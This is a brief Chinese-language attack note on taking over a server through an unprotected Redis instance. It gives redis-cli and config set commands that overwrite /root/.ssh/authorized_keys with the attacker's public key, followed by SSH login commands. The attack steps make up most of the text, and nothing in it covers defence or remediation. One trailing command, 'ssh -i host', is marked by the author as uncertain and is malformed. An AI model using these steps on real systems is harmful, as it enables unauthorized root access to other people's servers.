
利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 `/root/.ssh` 文件夹的`authotrized_keys` 文件中，进而可以直接使用对应的私钥登录目标服务器。

> 攻击端，生成公私钥，写入不设防的redis

```bash
cat key.txt | redis-cli -h hostname --pass xxx -x set xxx
```

```redis
config set dir /root/.ssh  # 设置路径
config set dbfilename authorized_keys   # 设置文件名
save  # 保存 被攻击的服务器将会被覆盖 .ssh/authorized_keys文件
```
> 攻击端免密登入被攻击服务器

```bash
ssh -i id_rsa user@host
ssh -i host  # 好像也可以的
```

